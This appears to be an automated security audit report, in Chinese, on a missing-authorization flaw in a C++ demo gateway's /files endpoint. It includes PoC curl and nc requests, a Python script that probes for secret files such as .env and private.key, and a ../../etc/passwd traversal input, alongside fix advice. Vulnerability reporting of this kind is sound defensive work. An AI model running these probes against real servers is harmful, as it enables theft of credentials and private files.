# VULN-SEC-CPP-AUTHZ-FILE-007: /files 端点完全缺失授权检查导致任意文件匿名读取

**严重性**: Critical | **CWE**: CWE-862 (Missing Authorization) | **置信度**: 95/100
**位置**: `src/main.cpp:54-62` @ `main(files_route_handler)`
**语言/框架**: C++ / posix_sockets
**分析类型**: authz (授权分析)
**Source/Sink**: network_request → authorization_decision
**规则/证据来源**: c_cpp.authz.missing_authorization / llm

---

## 1. 漏洞细节

`GET /files` HTTP 端点完全缺失授权（Authorization）机制。该端点接受任意 `name` 查询参数，直接调用 `FileCache::readTextFile(name)` 读取并返回 `data/` 目录下的文件内容，在整个请求处理链路中不存在任何权限校验。

具体而言，该漏洞表现为以下四个层面的授权缺失：

1. **无认证（Authentication）**: 端点不要求任何身份凭证（Session Token、API Key 等）。审计日志中将用户硬编码记录为 `"anonymous"`（main.cpp:56），表明设计上就没有考虑用户身份识别。
2. **无角色访问控制（RBAC）**: 项目中已存在 `UserStore` 类（main.cpp:30），提供 `authenticate()` 和 `isAdmin()` 方法，且 `/login` 端点已使用该类进行认证。但 `/files` 端点的 handler lambda 甚至没有捕获 `users` 变量，完全绕过了已有的用户管理体系。
3. **无文件级 ACL**: `FileCache::readTextFile()` 对传入的文件名不做任何白名单/黑名单过滤，不检查文件所有权，不区分文件敏感级别。
4. **无用户隔离**: 不同用户（如果存在认证的话）可以访问完全相同的文件集合，没有按用户划分文件访问范围。

`HttpServer` 类（http_server.cpp:81-134）在 `run()` 方法中直接将请求分派到注册的 handler，没有任何中间件层或拦截器进行统一的认证/授权检查。服务器绑定到 `INADDR_ANY`（0.0.0.0），对所有网络接口开放。

### 证据摘要

- 触发源: network_request（HTTP GET 请求的 `name` 查询参数）
- 危险点: authorization_decision（缺失授权决策点，直接执行文件读取）
- 已检查的清洗/缓解: 无 RBAC 检查，无文件 ACL，无所有权验证，无用户隔离。UserStore 类存在但 /files handler 未使用。
- 关键证据:
  - main.cpp:56 审计日志硬编码 `"anonymous"`，证明无身份识别
  - main.cpp:54 handler lambda 捕获列表中未包含 `users`（UserStore），证明无认证/授权意图
  - file_cache.cpp:11 `std::ifstream file(baseDir_ + "/" + name)` 无任何权限判断
  - http_server.cpp:120-128 服务器直接分派到 handler，无中间件层

## 2. 漏洞代码

**文件**: `src/main.cpp` (行 54-62)

```cpp
// main.cpp:54-62 — /files 路由 handler，无任何授权检查
server.route("GET", "/files", [&](const HttpRequest& request) {
    std::string name = queryValue(request, "name");  // ← 用户输入，无校验
    audit.event("anonymous", "read-file", name);     // ← 硬编码 "anonymous"，无身份识别
    try {
      return text(200, files.readTextFile(name));    // ← 直接读取文件，无权限判断
    } catch (const std::exception& ex) {
      return text(404, std::string("error=") + ex.what() + "\n");
    }
});
```

**文件**: `src/file_cache.cpp` (行 10-18)

```cpp
// file_cache.cpp:10-18 — readTextFile 无 ACL/权限门控
std::string FileCache::readTextFile(const std::string& name) const {
  std::ifstream file(baseDir_ + "/" + name);  // ← 直接拼接路径，无白名单/黑名单
  if (!file) {
    throw std::runtime_error("file not found");
  }

  std::ostringstream data;
  data << file.rdbuf();
  return data.str();  // ← 返回完整文件内容
}
```

**对比**: `/login` 端点使用了 `UserStore` 进行认证（main.cpp:40-52），而 `/files` 端点完全未使用：

```cpp
// main.cpp:40-52 — /login 端点正确使用了 UserStore
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);

    if (!users.authenticate(username, password)) {  // ← 使用了认证
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);
    return text(200, "session=" + token + "\n");
});
```

**代码分析**: `/files` handler 的 lambda 捕获列表为 `[&]`（按引用捕获所有局部变量），理论上可以访问 `users` 对象，但代码中从未调用 `users.authenticate()` 或 `users.isAdmin()`。这不是技术限制导致的遗漏，而是开发者的疏忽——已有的用户管理体系被完全忽略。

## 3. 完整攻击链路

```
[入口点] GET /files?name=<任意文件名> — HttpServer 监听 0.0.0.0:8080
  ↓ http_server.cpp:119 parseRequest() 解析 HTTP 请求，提取 query 参数
[请求分派] http_server.cpp:120-127 — handlers_.find() 匹配路由，直接调用 handler
  ↓ 无中间件，无认证拦截，请求直达 handler
[参数提取] main.cpp:55 queryValue(request, "name") — 提取 name 参数
  ↓ name 为攻击者完全可控的字符串
[审计记录] main.cpp:56 audit.event("anonymous", ...) — 硬编码匿名身份
  ↓ 无身份验证，直接跳过
[文件读取] main.cpp:58 files.readTextFile(name) — 无权限判断
  ↓ name 原样传入 FileCache
[路径拼接] file_cache.cpp:11 baseDir_ + "/" + name — 直接拼接
  ↓ 无路径规范化，无白名单过滤
[文件打开] file_cache.cpp:11 std::ifstream("data/" + name) — 打开文件
  ↓ 读取完整文件内容
[响应返回] main.cpp:58 text(200, ...) — 文件内容通过 HTTP 200 返回给攻击者
```

**链路验证**:

1. **入口可达性**: `HttpServer::run()` 在 main.cpp:77 被调用，监听 `INADDR_ANY:8080`，任何能访问该端口的网络客户端均可发送请求。
2. **无中间件拦截**: `http_server.cpp:120-128` 显示服务器直接通过 `handlers_.find()` 查找并调用 handler，没有任何认证/授权中间件层。
3. **参数无清洗**: `queryValue()` (main.cpp:13-16) 仅从 `request.query` map 中查找键值，不做任何验证或过滤。
4. **无权限门控**: handler 内部和 `readTextFile()` 内部均无任何权限检查逻辑。
5. **数据完整返回**: `readTextFile()` 通过 `data << file.rdbuf()` 读取完整文件内容并通过 HTTP 响应返回。

## 4. 攻击场景

**攻击者画像**: 远程未认证攻击者。任何能够访问目标服务器 8080 端口的网络用户，无需任何凭证或特殊权限。

**攻击向量**: HTTP GET 请求，通过 `name` 查询参数指定要读取的文件名。

**利用难度**: 低

### 攻击步骤

1. 攻击者确认目标服务器运行在可访问的 IP 地址的 8080 端口上
2. 攻击者发送 `GET /files?name=welcome.txt` 请求，验证端点可用
3. 攻击者遍历 `data/` 目录下的文件名（通过猜测、目录枚举或结合其他信息泄露漏洞），逐一读取文件内容
4. 如果 `data/` 目录中包含敏感文件（配置文件、密钥、用户数据等），攻击者可直接获取这些敏感信息
5. 攻击者还可尝试路径遍历（如 `name=../../etc/passwd`），尝试读取 `data/` 目录之外的系统文件（注：路径遍历属于独立漏洞 CWE-22，此处仅记录授权缺失）

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                     |
| ---------- | -------------- | ---------------------------------------------------------------------------------------- |
| 网络可达性 | 需要网络访问   | 服务器绑定 `INADDR_ANY`（0.0.0.0:8080），任何能路由到该端口的网络客户端均可访问          |
| 认证要求   | 无需认证       | 端点完全不需要任何身份凭证，匿名访问即可利用                                             |
| 配置依赖   | 无特殊配置要求 | 服务器默认启动即注册 `/files` 路由，无需额外配置触发                                     |
| 环境依赖   | 无特殊依赖     | 只要 `data/` 目录存在且包含文件，即可被读取。标准编译即可运行，无需特殊编译选项          |
| 时序条件   | 无时序依赖     | 漏洞在任何时刻均可利用，不存在竞态条件                                                   |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                   |
| -------- | ---- | ------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | `data/` 目录下的所有文件可被任意匿名用户读取。若目录中包含配置、密钥、用户数据等敏感文件，将导致信息泄露 |
| 完整性   | 无   | 该端点仅提供文件读取功能（GET），不涉及文件写入或修改                                                  |
| 可用性   | 低   | 大量请求可能造成拒绝服务，但这不是该漏洞的主要风险                                                     |

**影响范围**: 所有存储在 `data/` 目录下的文件均可被匿名访问。影响范围取决于该目录中存储的数据敏感程度。结合路径遍历漏洞（如存在），影响可扩展至整个文件系统。此外，由于该端点无认证，攻击者可以批量枚举和下载所有文件，造成大规模数据泄露。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1: 基本文件读取（curl）

```bash
# 验证 /files 端点可匿名访问，读取 data/welcome.txt
curl -v "http://<TARGET_IP>:8080/files?name=welcome.txt"

# 预期返回 HTTP 200 及文件内容：
# Welcome to the edge gateway demo.
```

### PoC 2: 批量文件枚举（Python）

```python
#!/usr/bin/env python3
"""
PoC: /files 端点匿名文件读取验证
仅供安全测试使用 - 验证 CWE-862 缺失授权漏洞
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"

# 常见文件名枚举列表
filenames = [
    "welcome.txt",
    "config.json", "config.yaml", "config.ini",
    "users.db", "users.json",
    "secrets.txt", "keys.pem", "private.key",
    ".env", "credentials",
    "backup.tar", "data.csv",
]

print(f"[*] 目标: {TARGET}")
print(f"[*] 测试 /files 端点授权缺失 (CWE-862)")
print()

for name in filenames:
    try:
        resp = requests.get(f"{TARGET}/files", params={"name": name}, timeout=5)
        if resp.status_code == 200:
            print(f"[!] 成功读取: {name} ({len(resp.text)} 字节)")
            print(f"    内容预览: {resp.text[:100]}")
        else:
            print(f"[-] 未找到: {name} (HTTP {resp.status_code})")
    except Exception as e:
        print(f"[!] 请求失败: {name} - {e}")
```

### PoC 3: 原始 HTTP 请求（用于无 curl 环境）

```
GET /files?name=welcome.txt HTTP/1.1
Host: <TARGET_IP>:8080
Connection: close
```

**使用说明**: 将 `<TARGET_IP>` 替换为目标服务器 IP 地址。PoC 1 使用 curl 即可快速验证。PoC 2 为 Python 脚本，可批量枚举文件名。PoC 3 可通过 netcat 发送：`echo -e "GET /files?name=welcome.txt HTTP/1.1\r\nHost: target\r\nConnection: close\r\n\r\n" | nc <TARGET_IP> 8080`

**预期结果**: 服务器返回 HTTP 200 状态码及请求文件的完整内容，无需提供任何认证凭证。

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（Ubuntu 20.04+ 或类似发行版）
- 编译器: g++ 9+ 或 clang++ 10+（支持 C++17）
- 依赖: 标准 C++ 库，POSIX socket API（Linux 自带）

### 构建步骤

```bash
# 假设项目根目录包含 CMakeLists.txt 或 Makefile
# 使用项目自带的构建系统编译
cd /scan/project
# 如果有 Makefile:
make
# 如果有 CMakeLists.txt:
mkdir build && cd build && cmake .. && make
```

### 运行配置

```bash
# 确保 data/ 目录存在且包含测试文件
ls -la data/
# data/welcome.txt 应已存在

# 启动服务器（默认端口 8080）
./edge-gateway
# 或指定端口:
./edge-gateway 8080
```

### 验证步骤

1. 启动服务器：`./edge-gateway 8080`
2. 在另一终端发送未认证请求：`curl "http://127.0.0.1:8080/files?name=welcome.txt"`
3. 观察服务器返回 HTTP 200 及文件内容 `"Welcome to the edge gateway demo."`
4. 对比 `/login` 端点的行为：`curl -X POST "http://127.0.0.1:8080/login?user=test&password=wrong"` 返回 401
5. 确认 `/files` 端点在无任何认证的情况下即可成功读取文件

### 预期结果

- `/files?name=welcome.txt` 返回 HTTP 200 及文件内容，无需任何认证凭证
- 审计日志（`edge-gateway.audit.log`）中记录用户为 `"anonymous"`
- 任何文件名参数均被接受，无权限拒绝机制

## 9. 修复建议

1. **添加认证中间件**: 在 `/files` handler 中验证 Session Token，拒绝未认证请求：
   ```cpp
   server.route("GET", "/files", [&](const HttpRequest& request) {
       std::string token = queryValue(request, "token");
       if (!users.validateSession(token)) {
           return text(401, "unauthorized\n");
       }
       // ... 继续处理
   });
   ```

2. **实现文件级 ACL**: 为每个文件关联所有者/权限，仅允许授权用户访问其拥有的文件。

3. **添加文件白名单**: 限制可访问的文件名范围，拒绝不在白名单中的请求。

4. **路径规范化**: 对 `name` 参数进行路径规范化（`realpath()`），防止路径遍历攻击。

5. **用户隔离**: 基于认证用户的身份，限制其只能访问自己有权查看的文件子集。
